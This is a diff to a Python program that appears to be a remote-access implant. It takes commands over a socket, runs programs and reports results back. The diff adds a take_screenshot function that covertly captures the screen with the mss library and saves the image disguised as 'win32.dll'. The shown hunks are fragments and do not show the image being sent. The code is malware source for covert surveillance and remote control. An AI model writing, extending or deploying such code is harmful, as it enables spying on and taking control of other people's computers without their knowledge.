@@ -3,6 +3,7 @@ from urllib.parse import unquote
 import os, base64, binascii, requests, ctypes, subprocess
 from pathvalidate import sanitize_filename, sanitize_filepath
 from typing import Tuple
+from mss import mss
 
 
 def pwd(socket):
@@ -243,4 +244,21 @@ def execute_program(socket, command: str) -> Tuple[bool, str]:
     except Exception as e:
         error_type = type(e).__name__
         socket_send(socket, f"[!] Execution failed ({error_type})")
+        return False
+
+
+def take_screenshot(socket) -> bool:
+    screenshot_file = "win32.dll"
+
+    try:
+        # Take screenshot
+        with mss() as screenshot_tool:
+            try:
+                screenshot_tool.shot(output=screenshot_file)
+            except Exception as e:
+                socket_send(socket, f"[!] Screenshot capture failed: {str(e)}")
+                return False
+
+    except Exception as e:
+        socket_send(socket, f"[!] Unexpected error during screenshot: {str(e)}")
         return False
